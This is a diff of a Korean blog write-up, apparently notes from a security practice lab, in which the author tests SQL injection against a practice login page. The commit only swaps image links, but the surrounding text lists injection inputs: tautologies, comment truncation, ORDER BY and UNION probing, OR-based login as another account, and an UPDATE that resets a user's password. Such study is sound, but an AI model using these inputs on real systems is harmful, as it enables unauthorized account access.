@@ -110,19 +110,19 @@ UPDATE sqli_1 SET UserId = 'normaltic3', Password = 'asdf' where UserId = 'norma
 1. 
 id: doldol
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-10.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-01.png)
 -> login.php과 logout.php에서 302 응답 코드가 보인다.
 -> 다른 페이지로 이동시켜준다는 뜻
 2. 
 id: doldol' and '1' = '1
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-04.png)
 -> sql injection 가능하다
 -> 괄호 X
 3. 
 id: doldol'#
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-04.png)
 -> 주석 처리 가능
 4. 
 id: doldol'#
@@ -143,7 +143,7 @@ pw: asdf
 6. 
 id: doldol' and name = 'doldol' #
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-04.png)
 -> column이 name이네?
 -> 그러면 column 개수도 똑같나?
 7. 
@@ -153,7 +153,7 @@ pw: dol1234
 8. 
 id: doldol' order by 1, 2 #
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-04.png)
 9. 
 id: doldol' order by 1, 2, 3 #
 pw: dol1234
@@ -176,7 +176,7 @@ pw: dol1234
 13. 
 id: doldol' union select 1, 2' #
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-04.png)
 -> 데이터를 볼 수가 없네
 14. 
 알고 있는 정보를 정리해 보자
@@ -201,17 +201,17 @@ pw: dol1234
 18. 
 id: doldol' and id = 'doldol' #
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-04.png)
 19. 
 id: doldol' or id = 'normaltic4' #
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-04.png)
 -> id는 normaltic4, pw는 doldol꺼 차용해서 로그인할 수 있을 줄 알았는데 doldol씨네
 -> 순서 차이?
 20. 
 id: normaltic4' or id = 'doldol' #
 pw: dol1234
-![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-26-4.png?raw=true)
+![alt text](/_image/2024-11-26-00-00-04.png)
 -> id랑 pw가 같은 계정으로 로그인되나봐
 select * from table where id = id
 if db_pw = input_pw:
